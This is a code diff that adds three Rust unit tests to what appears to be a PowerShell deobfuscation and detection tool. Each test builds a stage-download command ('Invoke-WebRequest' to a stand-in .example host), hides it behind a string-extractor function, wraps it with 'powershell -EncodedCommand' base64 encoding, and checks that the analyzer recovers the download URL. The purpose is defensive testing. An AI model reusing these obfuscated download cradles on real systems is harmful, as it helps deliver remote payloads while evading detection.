@@ -23328,6 +23328,114 @@ Piece 'noise|{decoded}|tail' 1"#
     }
 
     #[test]
+    fn ps1_literal_constant_split_operator_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-const-split-operator.example/stage.ps1";
+        let inner = format!(
+            r#"function Piece($value) {{
+  return ($value -split '|')[1]
+}}
+Piece 'noise|{decoded}|tail'"#
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-const-split-operator.example/stage.ps1"
+                )
+            }),
+            "literal constant split-operator extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_hyphenated_function_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-hyphen-function-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function Get-Text($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Get-Text '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-hyphen-function-extractor.example/stage.ps1"
+                )
+            }),
+            "hyphenated-function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_scoped_function_name_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-scoped-function-extractor.example/stage.ps1";
+        let carrier = format!("zz{}yy", decoded);
+        let inner = format!(
+            r#"function script:Get-Text($value,$start,$count) {{
+  return $value.Substring($start,$count)
+}}
+Get-Text '{carrier}' 2 {len}"#,
+            len = decoded.len()
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-scoped-function-extractor.example/stage.ps1"
+                )
+            }),
+            "scoped-function extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_constant_index_extractor_calls_recover_nested_command() {
         use base64::Engine;
 
